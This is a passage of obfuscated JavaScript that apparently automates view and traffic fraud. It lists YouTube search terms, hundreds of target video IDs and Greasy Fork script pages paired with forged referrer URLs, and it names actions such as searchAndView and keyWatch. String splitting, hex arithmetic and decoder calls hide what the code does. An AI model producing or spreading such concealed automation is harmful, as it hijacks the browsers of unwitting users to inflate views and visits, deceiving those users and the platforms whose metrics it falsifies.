searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1 * -0xfef + 0x1 * -0x183d + 0x858)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x216d + 0x24d5 + -0x35e)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + X(0x8) + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x22d2 + 0x12df + -0x35ae);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    Y(0xb, '5)Ue') + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    X(0xc) + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    Y(0xa, '@$]v') + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + Y(0x0, '98#Y'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': X(0x9) + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + Z(0x11) + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': Y(0xd, '4TRY') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0xf, '6*Tk') + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
